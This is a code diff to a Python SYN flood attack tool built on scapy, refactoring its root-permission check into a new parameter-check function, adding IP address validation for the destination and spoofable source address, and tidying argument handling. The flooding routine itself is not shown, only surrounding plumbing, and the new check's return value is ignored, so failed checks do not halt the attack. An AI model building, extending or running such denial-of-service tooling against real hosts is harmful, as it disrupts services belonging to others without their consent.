@@ -5,6 +5,8 @@ from random import randint
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 
+import ipaddress
+
 
 def usage():
     print("SYN FLOOD attack script")
@@ -51,6 +53,30 @@ class Flooder(Thread):
             sys.exit(0)
 
 
+def check_param(destination_ip, port, source_ip, num_thread):
+    ############### Check permissions ###############
+    uid = os.getuid()
+    if uid == 0:
+        print("[*] Permissions look good.")
+        time.sleep(0.5)
+    else:
+        print('[-] Not enough permissions to run this script. Try with sudo...')
+        return -2
+
+    ############### Check IPs ###############
+    try:  # Check the destination address
+        ipaddress.ip_address(destination_ip)
+    except:
+        print("Wrong destination address")
+        return -1
+
+    try:  # Check the source address
+        ipaddress.ip_address(source_ip)
+    except:
+        print("Wrong source address")
+        return -1
+
+
 def run_atk(destination_ip, port, source_ip, num_thread):
     """
     TODO Check unused port
@@ -60,14 +86,7 @@ def run_atk(destination_ip, port, source_ip, num_thread):
     :param num_thread:
     :return:
     """
-    # Check for the right permissions to run the code
-    uid = os.getuid()
-    if uid == 0:
-        print("[*] Permissions look good.")
-        time.sleep(0.5)
-    else:
-        print('[-] Not enough permissions to run this script. Try with sudo...')
-        sys.exit(1)
+    check_param(destination_ip, port, source_ip, num_thread)
 
     target_port = port
 
@@ -85,7 +104,7 @@ def run_atk(destination_ip, port, source_ip, num_thread):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Flooder 2.0: SYN FLOOD Attack Tool")
+    parser = argparse.ArgumentParser(description="SYN FLOOD Attack Tool")
     parser.add_argument("-d", "--destination", help="Destination IP Address")
     parser.add_argument("-p", "--port", help="Destination Port")
     parser.add_argument("-s", "--source", help="Source address to send from")
@@ -93,10 +112,10 @@ def main():
 
     args = parser.parse_args()
 
+    # Check length of input parameters and that the thread amount is a number
     if not len(sys.argv[1:]) or args.threads.isdigit() is False:
         usage()
-
-    # TODO Add more checks
+        return -1
 
     run_atk(args.destination, int(args.port), args.source, int(args.threads))
 
